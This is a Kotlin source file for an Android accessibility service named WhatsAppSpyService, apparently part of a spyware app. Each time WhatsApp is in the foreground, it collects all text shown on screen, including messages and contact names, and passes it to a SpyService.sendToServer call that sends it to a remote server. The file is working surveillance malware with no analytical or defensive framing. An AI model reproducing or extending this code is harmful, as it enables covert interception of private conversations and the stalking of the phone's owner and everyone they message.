package com.uk.core

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class WhatsAppSpyService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.packageName == "com.whatsapp") {
            val root = rootInActiveWindow ?: return
            val allText = StringBuilder()
            extractText(root, allText)
            if (allText.isNotEmpty()) {
                SpyService.sendToServer(mapOf("type" to "wa_data", "text" to allText.toString()))
            }
        }
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null) sb.append(node.text).append("\n")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    override fun onInterrupt() {}
}